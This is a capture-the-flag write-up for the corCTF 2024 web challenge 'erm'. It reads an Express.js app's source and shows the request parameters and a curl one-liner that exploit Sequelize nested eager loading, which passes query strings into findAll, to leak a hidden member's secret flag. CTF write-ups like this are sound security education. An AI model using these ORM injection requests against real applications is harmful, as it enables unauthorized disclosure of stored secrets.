# erm

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- Contributor: @colonneil, @obeidat.
- 56 solves / 249 points
- Author: @maple3142
- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

erm guys? why does goroo have the flag?

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2024/images/Pasted%20image%2020240729201324.png)

In here, we can read a typical CTF team website.

Writeups page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2024/images/Pasted%20image%2020240729201441.png)

In here, we can click on those categories below the "Writeups" header to filter out unwanted writeups. For example, I only want "web" category writeups:

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2024/images/Pasted%20image%2020240729201612.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2024/images/Pasted%20image%2020240729201824.png)

When we clicked on those category buttons, it'll send a **GET request to `/api/writeups` with GET parameter `where[category]`**.

We can also read those writeups by clicking the title link:

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2024/images/Pasted%20image%2020240729201716.png)

Members page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2024/images/Pasted%20image%2020240729201737.png)

This page is just showing all the members in Crusaders of Rust.

There's not much we can do in here, let's read this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2024/web/erm/erm.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/corCTF-2024/web/erm)-[2024.07.29|20:20:00(HKT)]
└> file erm.tar.gz                
erm.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 112640
┌[siunam♥Mercury]-(~/ctf/corCTF-2024/web/erm)-[2024.07.29|20:20:01(HKT)]
└> tar xvzf erm.tar.gz                
erm/
erm/package.json
erm/package-lock.json
erm/app.js
erm/db.js
erm/views/
erm/views/index.hbs
erm/views/members.hbs
erm/views/writeups.hbs
erm/views/writeup.hbs
erm/views/layout.hbs
erm/Dockerfile
```

After reading the source code, we have the following findings:

1. This web application is written in Node.js with Express.js web application framework
2. It uses SQLite store all the members, writeups, and categories
3. It uses [Sequelize](https://sequelize.org/) ORM version 6 to interact with the SQLite database

Let's deep dive into the main logic of this web application!

First, what's our objective? Where's the flag?

**In `erm/db.js`, we can see that the flag is stored in member `goroo`'s `secret`:**
```javascript
const { Sequelize, DataTypes, Op } = require('sequelize');
[...]
const sequelize = new Sequelize({
    dialect: 'sqlite',
    storage: 'erm.db',
    logging: false
});
[...]
sequelize.sync().then(async () => {
    [...]
    // the forbidden member
    // banned for leaking our solve scripts
    const goroo = await Member.create({ username: "goroo", secret: process.env.FLAG || "corctf{test_flag}", kicked: true });
    const web = await Category.findOne({ where: { name: "web" } });
    await goroo.addCategory(web);
    await web.addMember(goroo);
    [...]
});
```

So, our goal is to **somehow leak member `goroo`'s `secret`**.

Also, this `db.js` defined the database's structure.

Table `Category`:

```javascript
const Category = sequelize.define('Category', {
    name: {
        type: DataTypes.STRING,
        primaryKey: true,
        allowNull: false,
    }
});
```

Table `Member`:

```javascript
const Member = sequelize.define('Member', {
    username: {
        type: DataTypes.STRING,
        primaryKey: true,
        allowNull: false,
    },
    secret: {
        type: DataTypes.STRING,
    },
    kicked: {
        type: DataTypes.BOOLEAN,
        defaultValue: false,
    }
});
```

Table `Writeup`:

```javascript
const Writeup = sequelize.define('Writeup', {
    title: {
        type: DataTypes.STRING,
        allowNull: false
    },
    slug: {
        type: DataTypes.STRING,
        allowNull: false,
    },
    content: {
        type: DataTypes.TEXT,
        allowNull: false
    },
    date: {
        type: DataTypes.DATE,
        allowNull: false
    },
    category: {
        type: DataTypes.STRING,
    }
});
```

Moreover, in Sequelize, it supports standard associations, such as [One-To-One](https://en.wikipedia.org/wiki/One-to-one_%28data_model%29), [One-To-Many](https://en.wikipedia.org/wiki/One-to-many_%28data_model%29) and [Many-To-Many](https://en.wikipedia.org/wiki/Many-to-many_%28data_model%29). In our case, the database has the following relationships:

```javascript
Category.belongsToMany(Member, { through: 'MemberCategory' });
```

- Specifies a Many-To-Many relationship between table `Category` and `Member` through a join table called `MemberCategory`

```javascript
Member.belongsToMany(Category, { through: 'MemberCategory' });
```

- Specifies a Many-To-Many relationship between table `Member` and `Category` through the same `MemberCategory` join table

```javascript
Member.hasMany(Writeup);
```

- Specifies a One-To-Many relationship between table `Member` and `Writeup`, which means a member can have multiple writeups

```javascript
Writeup.belongsTo(Member);
```

- Specifies a Many-To-One relationship between table `Writeup` and `Member`, which means a writeup belongs to a single member

After knowing the SQLite database structure, we can move on to `erm/app.js`.

In GET route `/api/members`, it returns all the existing members. Well, except the `kicked` one, which is `goroo`:

```javascript
const express = require("express");
const hbs = require("hbs");

const app = express();

const db = require("./db.js");
[...]
// catches async errors and forwards them to error handler
// https://stackoverflow.com/a/51391081
const wrap = fn => (req, res, next) => {
    return Promise
        .resolve(fn(req, res, next))
        .catch(next);
};
[...]
app.get("/api/members", wrap(async (req, res) => {
    res.json({ members: (await db.Member.findAll({ include: db.Category, where: { kicked: false } })).map(m => m.toJSON()) });
}));
```

**In addition, GET route `/api/writeups` is obviously to be vulnerable to SQL injection:**
```javascript
app.get("/api/writeups", wrap(async (req, res) => {
    res.json({ writeups: (await db.Writeup.findAll(req.query)).map(w => w.toJSON()).sort((a,b) => b.date - a.date) });
}));
```

As you can see, it **parses our request's query directly into the `findOne` method**.

Before we started to read the source code, we came across with this API call:

```http
GET /api/writeups?where[category]=web HTTP/2
```

Which translate to:

```javascript
db.Writeup.findAll({ 
    where: { category: "web" }
}
```

Hmm... Can we somehow leak member `goroo`'s `secret` via this route?

If we dig deeper into the [Sequelize version 6 documentation](https://sequelize.org/docs/v6/), we'll see that there's a feature called "[Eager Loading](https://sequelize.org/docs/v6/advanced-association-concepts/eager-loading/)".

> [...]eager Loading is the act of querying data of several models at once (one 'main' model and one or more associated models). At the SQL level, this is a query with one or more [joins](https://en.wikipedia.org/wiki/Join_(SQL)).
> [...]
> In Sequelize, eager loading is mainly done by using the `include` option on a model finder query (such as `findOne`, `findAll`, etc).

Huh, looks like we can use option `include` to fetch a table (Model) associated with a table?

In this documentation, [it also mentioned that](https://sequelize.org/docs/v6/advanced-association-concepts/eager-loading/#including-everything) we can `include` all associated tables via `all` option:

```javascript
// Fetch all models associated with User
User.findAll({ include: { all: true } });
```

By looking at the table `Writeup`'s relationships, we can **leak member `goroo`'s `secret` by including all the relationships**.

To do so, we could send the following GET request to `/api/writeups`:

```http
GET /api/writeups?include[all]=true HTTP/2
Host: erm.be.ax


```

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2024/images/Pasted%20image%2020240729210756.png)

Huh? "An error occurred"?

Erm... Let's build this web application's Docker image and run the container:

```shell
┌[siunam♥Mercury]-(~/ctf/corCTF-2024/web/erm/erm)-[2024.07.29|21:08:52(HKT)]
└> docker build --tag erm:latest .     
[...]
┌[siunam♥Mercury]-(~/ctf/corCTF-2024/web/erm/erm)-[2024.07.29|21:08:58(HKT)]
└> docker run -p 80:5000 erm:latest     
web/erm listening on port 5000
seeding db with default data...
```

By sending the same request again but on our local environment, we can see this error:

```shell
EagerLoadingError [SequelizeEagerLoadingError]: include all 'true' is not valid - must be BelongsTo, HasOne, HasMany, One, Has, Many or All
    at Writeup._expandIncludeAllElement (/app/node_modules/sequelize/lib/model.js:348:17)
    at Writeup._expandIncludeAll (/app/node_modules/sequelize/lib/model.js:594:14)
    at Writeup.findAll (/app/node_modules/sequelize/lib/model.js:1117:10)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async /app/app.js:31:27
```

So, for some reasons, the `true` value should be `All`.

**Now, send the following request again. Table `Writeup`'s associations should be returned:**
```http
GET /api/writeups?include[all]=All HTTP/1.1
Host: localhost


```

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2024/images/Pasted%20image%2020240729211339.png)

Nice! Table `Member` is returned!

Now, how can we nested include all the associations between all the tables?

Sadly, during the CTF, I couldn't figure it out.

## Exploitation

So, after the CTF ended, I found out that we can do [**nested eager loading** based on this documentation](https://sequelize.org/docs/v6/advanced-association-concepts/eager-loading/#nested-eager-loading):

```javascript
const users = await User.findAll({
  include: {
    model: Tool,
    as: 'Instruments',
    include: {
      model: Teacher,
      include: [
        /* etc */
      ],
    },
  },
});
console.log(JSON.stringify(users, null, 2));
```

With that said, we can do nested eager loading with the following request:

```http
GET /api/writeups?include[all]=All&include[include][all]=All HTTP/1.1
Host: localhost


```

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2024/images/Pasted%20image%2020240729211854.png)

Nice! We now nest included table `Category`!

if we do the same thing again, we'll leak member `goroo`'s `secret`!

```http
GET /api/writeups?include[all]=All&include[include][all]=All&include[include][include][all]=All HTTP/1.1
Host: localhost


```

![](https://github.com/siunam321/CTF-Writeups/blob/main/corCTF-2024/images/Pasted%20image%2020240729212107.png)

Nice!

Let's send the same request to the remote challenge instance and get the real flag!

```shell
┌[siunam♥Mercury]-(~/ctf/corCTF-2024/web/erm/erm)-[2024.07.29|21:37:20(HKT)]
└> curl -s "https://erm.be.ax/api/writeups?include%5ball%5d=All&include%5binclude%5d%5ball%5d=All&include%5binclude%5d%5binclude%5d%5ball%5d=All" | jq -r '.writeups[0].Member.Categories[0].Members[-1].secret'
corctf{erm?_more_like_orm_amiright?}
```

- **Flag: `corctf{erm?_more_like_orm_amiright?}`**

## Conclusion

What we've learned:

1. Sequelize nested eager loading lead to information disclosure